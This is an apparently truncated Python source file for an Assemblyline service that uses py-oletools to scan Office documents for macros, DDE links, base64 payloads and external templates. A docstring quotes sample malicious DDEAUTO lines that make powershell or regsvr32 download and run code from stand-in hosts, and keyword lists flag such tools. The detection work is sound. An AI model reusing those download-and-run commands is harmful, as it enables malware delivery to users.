# wrapper service for py-oletools by Philippe Lagadec - http://www.decalage.info
from textwrap import dedent

from assemblyline.common.charset import safe_str
from assemblyline.common.exceptions import NonRecoverableError
from assemblyline.common.iprange import is_ip_reserved
from assemblyline.al.common.heuristics import Heuristic
from assemblyline.al.common.result import Result, ResultSection, SCORE, TAG_TYPE, TAG_WEIGHT, TAG_USAGE, TEXT_FORMAT
from assemblyline.al.install import SiteInstaller
from assemblyline.al.service.base import ServiceBase
from al_services.alsvc_oletools.stream_parser import Ole10Native, PowerPointDoc
import os
import re
import traceback
import hashlib
from operator import attrgetter
import zipfile
import zlib
import email
import json
import gzip
import unicodedata
import binascii

VBA_Parser = None
VBA_Scanner = None
OleID = None
Indicator = None
olefile = None
rtf_iter_objects = None


class Macro(object):
    macro_code = ''
    macro_sha256 = ''
    macro_section = None
    macro_score = 0

    def __init__(self, macro_code, macro_sha256, macro_section, macro_score=0):
        self.macro_code = macro_code
        self.macro_sha256 = macro_sha256
        self.macro_section = macro_section
        self.macro_score = macro_score


class Oletools(ServiceBase):
    # AL_Oletools_001 = Heuristic("AL_Oletools_001", "Attached Document Template", "document/office/ole",
    #                             dedent("""\
    #                                    /Attached template specified in xml relationships. This can be used
    #                                    for malicious purposes.
    #                                    """))
    AL_Oletools_002 = Heuristic("AL_Oletools_002", "Multi-embedded documents", "document/office/ole",
                                dedent("""\
                                       /File contains both old OLE format and new ODF format. This can be
                                        used to obfuscate malicious content.
                                       """))
    AL_Oletools_003 = Heuristic("AL_Oletools_003", "Massive document", "document/office/ole",
                                dedent("""\
                                       /File contains parts which are massive. Could not scan entire document.
                                       """))
    SERVICE_CATEGORY = 'Static Analysis'
    SERVICE_ACCEPTS = 'document/office/.*'
    SERVICE_DESCRIPTION = "This service extracts metadata and network information and reports anomalies in " \
                          "Microsoft OLE and XML documents using the Python library py-oletools."
    SERVICE_ENABLED = True
    SERVICE_VERSION = '3'
    SERVICE_REVISION = ServiceBase.parse_revision('$Id$')
    SERVICE_CPU_CORES = 0.5
    SERVICE_RAM_MB = 1024
    SERVICE_DEFAULT_CONFIG = {
        'MACRO_SCORE_MAX_FILE_SIZE': 5 * 1024**2,
        'MACRO_SCORE_MIN_ALERT': 0.6
    }

    MAX_STRINGDUMP_CHARS = 500
    MAX_STRING_SCORE = SCORE.VHIGH
    MAX_MACRO_SECTIONS = 3
    MIN_MACRO_SECTION_SCORE = SCORE.MED

    # in addition to those from olevba.py
    ADDITIONAL_SUSPICIOUS_KEYWORDS = ('WinHttp', 'WinHttpRequest', 'WinInet', 'Lib "kernel32" Alias')

    def __init__(self, cfg=None):
        super(Oletools, self).__init__(cfg)
        self._oletools_version = ''
        self.supported_ole_version = "0.52"
        self.request = None
        self.task = None
        self.ole_result = None
        self.scored_macro_uri = False
        self.ip_re = re.compile(
            r'^((?:(?:25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9]).){3}(?:25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9]))'
        )
        self.domain_re = re.compile('^((?:(?:[a-zA-Z0-9\-]+)\.)+[a-zA-Z]{2,5})')
        self.uri_re = re.compile(r'[a-zA-Z]+:/{1,3}[^/]+/[a-zA-Z0-9/\-.&%$#=~?_]+')
        self.re_executable_extensions = re.compile(r"(?i)\.(EXE|COM|PIF|GADGET|MSI|MSP|MSC|VBS|VBE|VB|JSE|JS"
                                                   r"|WSF|WSC|WSH|WS|BAT|CMD|DLL|SCR|HTA|CPL|CLASS|JAR|PS1XML|PS1"
                                                   r"|PS2XML|PS2|PSC1|PSC2|SCF|LNK|INF|REG)\b")

        self.re_vbs_hex = re.compile(r'(?:&H[A-Fa-f0-9]{2}&H[A-Fa-f0-9]{2}){32,}')
        self.word_chains = None
        self.macro_skip_words = None
        self.macro_words_re = re.compile("[a-z]{3,}")
        self.macro_score_max_size = cfg.get('MACRO_SCORE_MAX_FILE_SIZE', None)
        self.macro_score_min_alert = cfg.get('MACRO_SCORE_MIN_ALERT', 0.6)

        self.all_macros = None
        self.all_vba = None
        self.heurs = set()
        self.suspicious_strings = [
            # In maldoc.yara from decalage2/oledump-contrib/blob/master/
            (re.compile(r"(CloseHandle|CreateFile|GetProcAddr|GetSystemDirectory|GetTempPath|GetWindowsDirectory|IsBadReadPtr"
             "|IsBadWritePtr|LoadLibrary|ReadFile|SetFilePointer|ShellExecute|URLDownloadToFile|VirtualAlloc|WinExec"
             "|WriteFile)"), "use of suspicious system function"),
            # EXE
            (re.compile(r'This program cannot be run in DOS mode', re.M), "embedded executable"),
            (re.compile(r'(?s)MZ.{32,1024}PE\000\000'), "embedded executable"),
            # Javascript
            (re.compile(r'(function\(|\beval[ \t]*\(|new[ \t]+ActiveXObject\(|xfa\.((resolve|create)Node|datasets|form)|'
             '\.oneOfChild)'), "embedded javascript"),
        ]

    # noinspection PyUnresolvedReferences
    def import_service_deps(self):
        # Check version and exit when latest supported version is not installed
        si = SiteInstaller()
        if not si.check_version("oletools", self.supported_ole_version):
            raise NonRecoverableError("Oletools version out of date (requires {}). Reinstall service on worker(s) "
                                      "with /opt/al/pkg/assemblyline/al/install/reinstall_service.py Oletools"
                                      .format(self.supported_ole_version))

        from oletools.olevba import VBA_Parser, VBA_Scanner
        from oletools.oleid import OleID, Indicator
        from oletools.thirdparty.xxxswf import xxxswf
        from oletools.thirdparty.olefile import olefile
        import oletools.rtfobj as rtfparse
        from oletools import msodde, oleobj
        from io import BytesIO
        import magic
        import struct
        try:
            from al_services.alsvc_frankenstrings.balbuzard.patterns import PatternMatch
            global PatternMatch
        except ImportError:
            pass
        global VBA_Parser, VBA_Scanner
        global OleID, Indicator
        global olefile, xxxswf
        global rtfparse
        global msodde, oleobj
        global magic
        global struct
        global BytesIO

    def start(self):

        self.log.debug("Service started")

        from oletools.olevba import __version__ as olevba_version
        from oletools.oleid import __version__ as oleid_version
        from oletools.rtfobj import __version__ as rtfobj_version
        from oletools.msodde import __version__ as msodde_version
        self._oletools_version = 'svc v{}, olevba v{}, oleid v{}, rtfobj v{}, msodde v{}'\
            .format(self.SERVICE_VERSION, olevba_version, oleid_version, rtfobj_version, msodde_version)

        chain_path = os.path.join(os.path.dirname(__file__), "chains.json.gz")
        with gzip.open(chain_path) as fh:
            self.word_chains = json.load(fh)

        for k, v in self.word_chains.items():
            self.word_chains[k] = set(v)

        # Don't reward use of common keywords
        self.macro_skip_words = {'var', 'unescape', 'exec', 'for', 'while', 'array', 'object',
                                 'length', 'len', 'substr', 'substring', 'new', 'unicode', 'name', 'base',
                                 'dim', 'set', 'public', 'end', 'getobject', 'createobject', 'content',
                                 'regexp', 'date', 'false', 'true', 'none', 'break', 'continue', 'ubound',
                                 'none', 'undefined', 'activexobject', 'document', 'attribute', 'shell',
                                 'thisdocument', 'rem', 'string', 'byte', 'integer', 'int', 'function',
                                 'text', 'next', 'private', 'click', 'change', 'createtextfile', 'savetofile',
                                 'responsebody', 'opentextfile', 'resume', 'open', 'environment', 'write', 'close',
                                 'error', 'else', 'number', 'chr', 'sub', 'loop'}

    def get_tool_version(self):
        return self._oletools_version

    # CIC: Call If Callable
    @staticmethod
    def cic(expression):
        """
        From 'base64dump.py' by Didier Stevens@https://DidierStevens.com
        """
        if callable(expression):
            return expression()
        else:
            return expression

    # IFF: IF Function
    @classmethod
    def iff(cls, expression, value_true, value_false):
        """
        From 'base64dump.py' by Didier Stevens@https://DidierStevens.com
        """
        if expression:
            return cls.cic(value_true)
        else:
            return cls.cic(value_false)

    # Ascii Dump
    @classmethod
    def ascii_dump(cls, data):
        return ''.join([cls.iff(ord(b) >= 32, b, '.') for b in data])

    def execute(self, request):

        self.task = request.task
        request.result = Result()
        self.ole_result = request.result
        self.request = request
        self.sha = request.sha256
        self.scored_macro_uri = False

        self.all_macros = []
        self.all_vba = []

        path = request.download()
        filename = os.path.basename(path)
        file_contents = request.get()

        try:
            self.check_for_dde_links(path)
            self.check_for_macros(filename, file_contents, request.sha256)
            self.check_xml_strings(path)
            self.rip_mhtml(file_contents)
            self.extract_streams(path, file_contents)
            self.create_macro_sections(request.sha256)
        except Exception as e:
            self.log.error("We have encountered a critical error: {}".format(e))

        for h in self.heurs:
            request.result.report_heuristic(h)

        score_check = 0
        for section in self.ole_result.sections:
            score_check += self.calculate_nested_scores(section)

        if score_check == 0 and not request.deep_scan:
            request.result = Result()

        self.all_macros = None
        self.all_vba = None

        request.successful = True
        request.task.report_service_context(self._oletools_version)

    def check_for_indicators(self, filename):
        # noinspection PyBroadException
        try:
            ole_id = OleID(filename)
            indicators = ole_id.check()

            for indicator in indicators:
                # ignore these OleID indicators, they aren't all that useful
                if indicator.id in ("ole_format", "has_suminfo",):
                    continue

                indicator_score = SCORE.LOW  # default to LOW

                if indicator.value is True:
                    if indicator.id in ("word", "excel", "ppt", "visio"):
                        # good to know that the filetypes have been detected, but not a score-able offense
                        indicator_score = SCORE.NULL

                    section = ResultSection(indicator_score, "OleID indicator : " + indicator.name)
                    if indicator.description:
                        section.add_line(indicator.description)
                    self.ole_result.add_section(section)
        except:
            self.log.debug("OleID analysis failed")

    # Returns True if the URI should score
    # noinspection PyUnusedLocal
    def parse_uri(self, check_uri):
        m = self.uri_re.match(check_uri)
        if m is None:
            return False, ""
        else:
            full_uri = m.group(0)

        proto, uri = full_uri.split('://', 1)
        if proto == 'file':
            return False, ""

        scorable = False
        if "http://purl.org/" not in full_uri and \
                "http://xml.org/" not in full_uri and \
                ".openxmlformats.org/" not in full_uri and \
                ".oasis-open.org/" not in full_uri and \
                ".xmlsoap.org/" not in full_uri and \
                ".microsoft.com/" not in full_uri and \
                ".w3.org/" not in full_uri and \
                ".gc.ca/" not in full_uri and \
                ".mil.ca/" not in full_uri:

            self.ole_result.add_tag(TAG_TYPE.NET_FULL_URI,
                                    full_uri,
                                    TAG_WEIGHT.MED,
                                    usage=TAG_USAGE.CORRELATION)
            scorable = True

            domain = self.domain_re.match(uri)
            ip = self.ip_re.match(uri)
            if ip:
                ip_str = ip.group(1)
                if not is_ip_reserved(ip_str):
                    self.ole_result.add_tag(TAG_TYPE.NET_IP,
                                            ip_str,
                                            TAG_WEIGHT.HIGH,
                                            usage=TAG_USAGE.CORRELATION)
            elif domain:
                dom_str = domain.group(1)
                self.ole_result.add_tag(TAG_TYPE.NET_DOMAIN_NAME,
                                        dom_str,
                                        TAG_WEIGHT.HIGH,
                                        usage=TAG_USAGE.CORRELATION)

        return scorable, m.group(0)

    def decide_extract(self, ty, val):

        foi = ['APK', 'APP', 'BAT', 'BIN', 'CLASS', 'CMD', 'DAT', 'DLL', 'EXE', 'JAR', 'JS', 'JSE', 'LNK', 'MSI',
               'OSX', 'PAF', 'PS1', 'RAR', 'SCR', 'SWF', 'SYS', 'TMP', 'VBE', 'VBS', 'WSF', 'WSH', 'ZIP']

        if ty == 'FILE_NAME':
            fname, fext = val.rsplit('.', 1)
            if not fext.upper() in foi:
                return False
            if fname.startswith("oleObject"):
                return False

        if ty == 'PESTUDIO_BLACKLIST_STRING':
            if val == 'http':
                return False

        return True

    def check_xml_strings(self, path):
        xml_target_res = ResultSection(score=SCORE.NULL, title_text="Attached External Template Targets in XML")
        xml_ioc_res = ResultSection(score=SCORE.NULL, title_text="IOCs in zipped content:")
        xml_b64_res = ResultSection(score=SCORE.NULL, title_text="Base64 in zipped content:")
        try:
            template_re = re.compile(r'/(?:attachedTemplate|subDocument)".{1,512}[Tt]arget="((?!file)[^"]+)".{1,512}'
                                     r'[Tt]argetMode="External"', re.DOTALL)
            uris = []
            zip_uris = []
            b64results = {}
            b64_extracted = set()
            xml_extracted = set()
            if zipfile.is_zipfile(path):
                try:
                    patterns = PatternMatch()
                except:
                    patterns = None
                z = zipfile.ZipFile(path)
                for f in z.namelist():
                    extract_xml = False
                    data = z.open(f).read()
                    if len(data) > 500000:
                        data = data[:500000]
                        self.heurs.add(Oletools.AL_Oletools_003)
                        xml_ioc_res.score = min(xml_ioc_res.score, 1)
                    zip_uris.extend(template_re.findall(data))
                    # Use FrankenStrings modules to find other strings of interest
                    # Plain IOCs
                    if patterns:
                        pat_strs = ["http://purl.org", "schemas.microsoft.com", "schemas.openxmlformats.org",
                                    "www.w3.org"]
                        pat_ends = ["themeManager.xml", "MSO.DLL", "stdole2.tlb", "vbaProject.bin", "VBE6.DLL",
                                    "VBE7.DLL"]
                        pat_whitelist = ['Management', 'Manager', "microsoft.com"]

                        st_value = patterns.ioc_match(data, bogon_ip=True)
                        if len(st_value) > 0:
                            for ty, val in st_value.iteritems():
                                if val == "":
                                    asc_asc = unicodedata.normalize('NFKC', val).encode('ascii', 'ignore')
                                    if any(x in asc_asc for x in pat_strs) \
                                            or asc_asc.endswith(tuple(pat_ends)) \
                                            or asc_asc in pat_whitelist:
                                        continue
                                    else:
                                        extract_xml = self.decide_extract(ty, asc_asc)
                                        xml_ioc_res.score += 1
                                        xml_ioc_res.add_line("Found %s string: %s in file %s}"
                                                             % (TAG_TYPE[ty].replace("_", " "), asc_asc, f))
                                        xml_ioc_res.add_tag(TAG_TYPE[ty], asc_asc, TAG_WEIGHT.LOW)
                                else:
                                    ulis = list(set(val))
                                    for v in ulis:
                                        if any(x in v for x in pat_strs) \
                                                or v.endswith(tuple(pat_ends)) \
                                                or v in pat_whitelist:
                                            continue
                                        else:
                                            extract_xml = self.decide_extract(ty, v)
                                            xml_ioc_res.score += 1
                                            xml_ioc_res.add_line("Found %s string: %s in file %s"
                                                                 % (TAG_TYPE[ty].replace("_", " "), v, f))
                                            xml_ioc_res.add_tag(TAG_TYPE[ty], v, TAG_WEIGHT.LOW)

                    # Base64
                    b64_matches = set()
                    b64_ascii_content = []
                    for b64_match in re.findall('([\x20](?:[A-Za-z0-9+/]{3,}={0,2}[\r]?[\n]?){6,})',
                                                data):
                        b64 = b64_match.replace('\n', '').replace('\r', '').replace(' ', '')
                        uniq_char = ''.join(set(b64))
                        if len(uniq_char) > 6:
                            if len(b64) >= 16 and len(b64) % 4 == 0:
                                b64_matches.add(b64)
                    """
                    Using some selected code from 'base64dump.py' by Didier Stevens@https://DidierStevens.com
                    """
                    for b64_string in b64_matches:
                        b64_extract = False
                        try:
                            base64data = binascii.a2b_base64(b64_string)
                            sha256hash = hashlib.sha256(base64data).hexdigest()
                            if sha256hash in b64_extracted:
                                continue
                            # Search for embedded files of interest
                            if 500 < len(base64data) < 8000000:
                                m = magic.Magic(mime=True)
                                ftype = m.from_buffer(base64data)
                                if 'octet-stream' not in ftype:
                                    b64_file_path = os.path.join(self.working_directory,
                                                                         "{}_b64_decoded"
                                                                         .format(sha256hash[0:10]))
                                    self.request.add_extracted(b64_file_path,
                                                               "Extracted b64 file during "
                                                               "OLETools analysis.")
                                    with open(b64_file_path, 'wb') as b64_file:
                                        b64_file.write(base64data)
                                        self.log.debug("Submitted dropped file for analysis: {}"
                                                       .format(b64_file_path))

                                    b64results[sha256hash] = [len(b64_string), b64_string[0:50],
                                                              "[Possible base64 file contents in {}. "
                                                              "See extracted files.]" .format(f), "", ""]

                                    extract_xml = True
                                    b64_extract = True
                                    b64_extracted.add(sha256hash)
                                    break
                            # Dump the rest in results and its own file
                            if not b64_extract and len(base64data) > 30:
                                if all(ord(c) < 128 for c in base64data):
                                    check_utf16 = base64data.decode('utf-16').encode('ascii', 'ignore')
                                    if check_utf16 != "":
                                        asc_b64 = check_utf16
                                    else:
                                        asc_b64 = self.ascii_dump(base64data)
                                    # If data has less then 7 uniq chars then ignore
                                    uniq_char = ''.join(set(asc_b64))
                                    if len(uniq_char) > 6:
                                        if patterns:
                                            st_value = patterns.ioc_match(asc_b64, bogon_ip=True)
                                            if len(st_value) > 0:
                                                for ty, val in st_value.iteritems():
                                                    if val == "":
                                                        asc_asc = unicodedata.normalize('NFKC', val)\
                                                            .encode('ascii', 'ignore')
                                                        xml_ioc_res.add_tag(TAG_TYPE[ty], asc_asc, TAG_WEIGHT.LOW)
                                                    else:
                                                        ulis = list(set(val))
                                                        for v in ulis:
                                                            xml_ioc_res.add_tag(TAG_TYPE[ty], v, TAG_WEIGHT.LOW)
                                        extract_xml = True
                                        b64_ascii_content.append(asc_b64)
                                        b64results[sha256hash] = [len(b64_string), b64_string[0:50], asc_b64,
                                                                      base64data, "{}" .format(f)]
                        except:
                            pass

                    b64index = 0
                    for b64k, b64l in b64results.iteritems():
                        xml_b64_res.score = 100
                        b64index += 1
                        sub_b64_res = (ResultSection(SCORE.NULL, title_text="Result {0} in file {1}"
                                                     .format(b64index, f), parent=xml_b64_res))
                        sub_b64_res.add_line('BASE64 TEXT SIZE: {}'.format(b64l[0]))
                        sub_b64_res.add_line('BASE64 SAMPLE TEXT: {}[........]'.format(b64l[1]))
                        sub_b64_res.add_line('DECODED SHA256: {}'.format(b64k))
                        subb_b64_res = (ResultSection(SCORE.NULL, title_text="DECODED ASCII DUMP:",
                                                      body_format=TEXT_FORMAT.MEMORY_DUMP,
                                                      parent=sub_b64_res))
                        subb_b64_res.add_line('{}'.format(b64l[2]))
                        if b64l[3] != "":
                            if patterns:
                                st_value = patterns.ioc_match(b64l[3], bogon_ip=True)
                                if len(st_value) > 0:
                                    xml_b64_res.score += 1
                                    for ty, val in st_value.iteritems():
                                        if val == "":
                                            asc_asc = unicodedata.normalize('NFKC', val).encode\
                                                ('ascii', 'ignore')
                                            xml_b64_res.add_tag(TAG_TYPE[ty], asc_asc, TAG_WEIGHT.LOW)
                                        else:
                                            ulis = list(set(val))
                                            for v in ulis:
                                                xml_b64_res.add_tag(TAG_TYPE[ty], v, TAG_WEIGHT.LOW)

                    if len(b64_ascii_content) > 0:
                        all_b64 = "\n".join(b64_ascii_content)
                        b64_all_sha256 = hashlib.sha256(all_b64).hexdigest()
                        b64_file_path = os.path.join(self.working_directory, b64_all_sha256)
                        try:
                            with open(b64_file_path, 'wb') as fh:
                                fh.write(all_b64)
                            self.request.add_extracted(b64_file_path, "b64 for zipped file {}" .format(f),
                                                       "all_b64_{}.txt" .format(b64_all_sha256[:7]))
                        except Exception as e:
                            self.log.error("Error while adding extracted"
                                           " b64 content: {}: {}".format(b64_file_path, str(e)))

                    if extract_xml and not f.endswith("vbaProject.bin"):  # all vba extracted anyways
                        xml_sha256 = hashlib.sha256(data).hexdigest()
                        if xml_sha256 not in xml_extracted:
                            xml_file_path = os.path.join(self.working_directory, xml_sha256)
                            try:
                                with open(xml_file_path, 'wb') as fh:
                                    fh.write(data)

                                self.request.add_extracted(xml_file_path, "zipped file {} contents" .format(f),
                                                           "{}" .format(xml_sha256))
                                xml_extracted.add(xml_sha256)
                            except Exception as e:
                                self.log.error("Error while adding extracted"
                                               " content: {}: {}".format(xml_file_path, str(e)))

                z.close()

                for uri in zip_uris:
                    puri, duri = self.parse_uri(uri)
                    if puri:
                        uris.append(duri)

                uris = list(set(uris))
                # If there are domains or IPs, report them
                if uris:
                    xml_target_res.score = 500
                    xml_target_res.add_lines(uris)

        except Exception as e:
            self.log.debug("Failed to analyze zipped file: {}".format(e))

        if xml_target_res.score > 0:
            self.ole_result.add_section(xml_target_res)
        if xml_ioc_res.score > 0:
            self.ole_result.add_section(xml_ioc_res)
        if xml_b64_res.score > 0:
            self.ole_result.add_section(xml_b64_res)

    @staticmethod
    def sanitize_filename(filename, replacement='_', max_length=200):
        """From rtfoby.py"""
        """compute basename of filename. Replaces all non-whitelisted characters.
           The returned filename is always a basename of the file."""
        basepath = os.path.basename(filename).strip()
        sane_fname = re.sub(r'[^\w\.\- ]', replacement, basepath)

        while ".." in sane_fname:
            sane_fname = sane_fname.replace('..', '.')

        while "  " in sane_fname:
            sane_fname = sane_fname.replace('  ', ' ')

        if not len(filename):
            sane_fname = 'NONAME'

        # limit filename length
        if max_length:
            sane_fname = sane_fname[:max_length]

        return sane_fname

    @staticmethod
    def verifySWF(f, x):
        # Slightly modified code taken from oletools.thirdparty.xxpyswf verifySWF
        # Start of SWF
        f.seek(x)
        # Read Header
        header = f.read(3)
        # Read Version
        version = struct.unpack('<b', f.read(1))[0]
        # Read SWF Size
        size = struct.unpack('<i', f.read(4))[0]
        # Start of SWF
        f.seek(x)
        if version > 40 or not isinstance(size, int) or header not in ['CWS', 'FWS']:
            return None
        try:
            if header == 'FWS':
                swf_data = f.read(size)
            elif header == 'CWS':
                f.read(3)
                swf_data = 'FWS' + f.read(5) + zlib.decompress(f.read())
            else:
                #TODO: zws -- requires lzma in python 2.7
                return None
            return swf_data
        except Exception as e:
            return None

    def extract_swf_objects(self, f):
        swf_found = False
        # Taken from oletools.thirdparty.xxpyswf disneyland module
        # def disneyland(f, filename, options):
        retfindSWF = xxxswf.findSWF(f)
        f.seek(0)
        # for each SWF in file
        for idx, x in enumerate(retfindSWF):
            f.seek(x)
            h = f.read(1)
            f.seek(x)
            swf = self.verifySWF(f, x)
            if swf == None:
                continue
            swf_md5 = hashlib.sha256(swf).hexdigest()
            swf_path = os.path.join(self.working_directory, '{}.swf'.format(swf_md5))
            with open(swf_path, 'wb') as fh:
                fh.write(swf)
            self.request.add_extracted(swf_path, text="Flash file extracted during sample analysis")
            swf_found = True
        return swf_found

    def extract_vb_hex(self, encodedchunk):
        decoded = ''
        try:
            while encodedchunk != '':
                decoded += binascii.a2b_hex(encodedchunk[2:4])
                encodedchunk = encodedchunk[4:]
        except Exception:
            # If it fails, assuming not a real byte sequence
            return  False
        hex_md5 = hashlib.sha256(decoded).hexdigest()
        hex_path = os.path.join(self.working_directory, '{}.hex.decoded'.format(hex_md5))
        with open(hex_path, 'wb') as fh:
            fh.write(decoded)
        self.request.add_extracted(hex_path, text="Flash file extracted during sample analysis")

        return True

    # chains.json contains common English trigraphs. We score macros on how common these trigraphs appear in code,
    # skipping over some common keywords. A lower score indicates more randomized text, random variable/function names
    # are common in malicious macros.
    def flag_macro(self, macro_text):
        if self.macro_score_max_size is not None and len(macro_text) > self.macro_score_max_size:
            return False

        macro_text = macro_text.lower()
        score = 0.0

        word_count = 0
        byte_count = 0

        for m_cw in self.macro_words_re.finditer(macro_text):
            cw = m_cw.group(0)
            word_count += 1
            byte_count += len(cw)
            if cw in self.macro_skip_words:
                continue
            prefix = cw[0]
            tc = 0
            for i in xrange(1, len(cw) - 1):
                c = cw[i:i + 2]
                if c in self.word_chains.get(prefix, []):
                    tc += 1
                prefix = cw[i]

            score += tc / float(len(cw) - 2)

        if byte_count < 128 or word_count < 32:
            # these numbers are arbitrary, but if the sample is too short the score is worthless
            return False

        return (score / word_count) < self.macro_score_min_alert

    def create_macro_sections(self, request_hash):
        # noinspection PyBroadException
        try:
            filtered_macros = []
            if len(self.all_macros) > 0:
                # noinspection PyBroadException
                try:
                    # first sort all analyzed macros by their relative score, highest first
                    self.all_macros.sort(key=attrgetter('macro_score'), reverse=True)

                    # then only keep, theoretically, the most interesting ones
                    filtered_macros = self.all_macros[0:min(len(self.all_macros), self.MAX_MACRO_SECTIONS)]
                except:
                    self.log.debug("Sort and filtering of macro scores failed, "
                                   "reverting to full list of extracted macros")
                    filtered_macros = self.all_macros
            else:
                self.ole_result.add_section(ResultSection(SCORE.NULL, "No interesting macros found."))

            for macro in filtered_macros:
                if macro.macro_score >= self.MIN_MACRO_SECTION_SCORE:
                    self.ole_result.add_section(macro.macro_section)

            # Create extracted file for all VBA script.
            if len(self.all_vba) > 0:
                vba_file_path = ""
                all_vba = "\n".join(self.all_vba)
                vba_all_sha256 = hashlib.sha256(all_vba).hexdigest()
                if vba_all_sha256 == request_hash:
                    return

                try:
                    vba_file_path = os.path.join(self.working_directory, vba_all_sha256)
                    with open(vba_file_path, 'w') as fh:
                        fh.write(all_vba)

                    self.request.add_extracted(vba_file_path, "vba_code",
                                               "all_vba_%s.vba" % vba_all_sha256[:7])
                except Exception as e:
                    self.log.error("Error while adding extracted"
                                   " macro: {}: {}".format(vba_file_path, str(e)))
        except Exception as e:
            self.log.debug("OleVBA VBA_Parser.detect_vba_macros failed: {}".format(e))
            section = ResultSection(SCORE.NULL, "OleVBA : Error parsing macros: {}".format(e))
            self.ole_result.add_section(section)

    def check_for_dde_links(self, filepath):
        # noinspection PyBroadException
        try:
            # TODO -- undetermined if other fields could be misused.. maybe do 2 passes, 1 filtered & 1 not
            links_text = msodde.process_file(filepath=filepath, field_filter_mode=msodde.FIELD_FILTER_DDE)

            links_text = links_text.strip()
            if not links_text:
                return
            self.process_dde_links(links_text, self.ole_result)

        except Exception as exc:
            self.log.warn("msodde parsing for file {} failed: {}".format(self.sha, str(exc)))
            section = ResultSection(SCORE.NULL, "msodde : Error parsing document")
            self.ole_result.add_section(section)

    def process_dde_links(self, links_text, ole_section):
        ddeout_name = '{}.ddelinks.original'.format(self.request.sha256)
        ddeout_path = os.path.join(self.working_directory, ddeout_name)
        with open(ddeout_path, 'w') as fh:
            fh.write(links_text)
        self.request.add_extracted(name=ddeout_path, text=ddeout_name, display_name="Original DDE Links")

        """ typical results look like this:
        DDEAUTO "C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\windows\\system32\\WindowsPowerShell
        \\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden -C $e=(new-object system.net.webclient).downloadstring
        ('http://bad.ly/Short');powershell.exe -e $e # " "Legit.docx" 
        DDEAUTO c:\\Windows\\System32\\cmd.exe "/k powershell.exe -NoP -sta -NonI -W Hidden 
        $e=(New-Object System.Net.WebClient).DownloadString('http://203.0.113.111/payroll.ps1');powershell 
        -Command $e"
        DDEAUTO "C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\windows\\system32\\cmd.exe" 
        "/c regsvr32 /u /n /s /i:\"h\"t\"t\"p://downloads.bad.com/file scrobj.dll" "For Security Reasons" 
        """

        # to date haven't seen a sample with multiple links yet but it should be possible..
        dde_section = ResultSection(SCORE.MED, "MSO DDE Links:", body_format=TEXT_FORMAT.MEMORY_DUMP)
        dde_extracted = False
        looksbad = False

        suspicious_keywords = (
        'powershell.exe', 'cmd.exe', 'webclient', 'downloadstring', 'mshta.exe', 'scrobj.dll',
        'bitstransfer', 'cscript.exe', 'wscript.exe')
        for line in links_text.splitlines():
            if ' ' in line:
                (link_type, link_text) = line.strip().split(' ', 1)

                # do some cleanup here to aid visual inspection
                link_type = link_type.strip()
                link_text = link_text.strip()
                link_text = link_text.replace(u'\\\\', u'\u005c')  # a literal backslash
                link_text = link_text.replace(u'\\"', u'"')
                dde_section.add_line("Type: %s" % link_type)
                dde_section.add_line("Text: %s" % link_text)
                dde_section.add_line("\n\n")
                dde_extracted = True
                tag_weight = TAG_WEIGHT.HIGH

                ddeout_name = '{}.ddelinks'.format(hashlib.sha256(link_text).hexdigest())
                ddeout_path = os.path.join(self.working_directory, ddeout_name)
                with open(ddeout_path, 'w') as fh:
                    fh.write(link_text)
                self.request.add_extracted(name=ddeout_path, text=ddeout_name, display_name="Tweaked DDE Link")

                link_text_lower = link_text.lower()
                if any(x in link_text_lower for x in suspicious_keywords):
                    looksbad = True
                    tag_weight = TAG_WEIGHT.SURE

                ole_section.add_tag(TAG_TYPE.OLE_DDE_LINK,
                                    value=link_text,
                                    weight=tag_weight,
                                    usage=TAG_USAGE.CORRELATION)
        if dde_extracted:
            if looksbad:
                dde_section.change_score(SCORE.SURE)
            ole_section.add_section(dde_section)

    def check_for_macros(self, filename, file_contents, request_hash):
        # noinspection PyBroadException
        try:
            vba_parser = VBA_Parser(filename=filename, data=file_contents)

            try:
                if vba_parser.detect_vba_macros():
                    self.ole_result.add_tag(TAG_TYPE.TECHNIQUE_MACROS,
                                            "Contains VBA Macro(s)",
                                            weight=TAG_WEIGHT.LOW,
                                            usage=TAG_USAGE.IDENTIFICATION)

                    try:
                        for (subfilename, stream_path, vba_filename, vba_code) in vba_parser.extract_macros():
                            if vba_code.strip() == '':
                                continue
                            vba_code_sha256 = hashlib.sha256(vba_code).hexdigest()
                            if vba_code_sha256 == request_hash:
                                continue

                            self.all_vba.append(vba_code)
                            macro_section = self.macro_section_builder(vba_code)
                            toplevel_score = self.calculate_nested_scores(macro_section)

                            self.all_macros.append(Macro(vba_code, vba_code_sha256, macro_section, toplevel_score))
                    except Exception as e:
                        self.log.debug("OleVBA VBA_Parser.extract_macros failed: {}".format(str(e)))
                        section = ResultSection(SCORE.NULL, "OleVBA : Error extracting macros")
                        self.ole_result.add_section(section)

            except Exception as e:
                self.log.debug("OleVBA VBA_Parser.detect_vba_macros failed: {}".format(e))
                section = ResultSection(SCORE.NULL, "OleVBA : Error parsing macros: {}".format(e))
                self.ole_result.add_section(section)
        except:
            self.log.debug("OleVBA VBA_Parser constructor failed, may not be a supported OLE document")

    def calculate_nested_scores(self, section):
        score = section.score
        if len(section.subsections) > 0:
            for subsection in section.subsections:
                score = score + self.calculate_nested_scores(subsection)
        return score

    def macro_section_builder(self, vba_code):

        vba_code_sha256 = hashlib.sha256(vba_code).hexdigest()
        macro_section = ResultSection(SCORE.NULL, "OleVBA : Macro detected")
        macro_section.add_line("Macro SHA256 : %s" % vba_code_sha256)
        #macro_section.add_line("Resubmitted macro as: macro_%s.vba" % vba_code_sha256[:7])
        macro_section.add_tag(TAG_TYPE.OLE_MACRO_SHA256,
                              vba_code_sha256,
                              weight=TAG_WEIGHT.LOW,
                              usage=TAG_USAGE.CORRELATION)

        dump_title = "Macro contents dump"
        analyzed_code = self.deobfuscator(vba_code)
        req_deob = False
        if analyzed_code != vba_code:
            req_deob = True
            dump_title += " [deobfuscated]"

        if len(analyzed_code) > self.MAX_STRINGDUMP_CHARS:
            dump_title += " - Displaying only the first %s characters." % self.MAX_STRINGDUMP_CHARS
            dump_subsection = ResultSection(SCORE.NULL, dump_title, body_format=TEXT_FORMAT.MEMORY_DUMP)
            dump_subsection.add_line(analyzed_code[0:self.MAX_STRINGDUMP_CHARS])
        else:
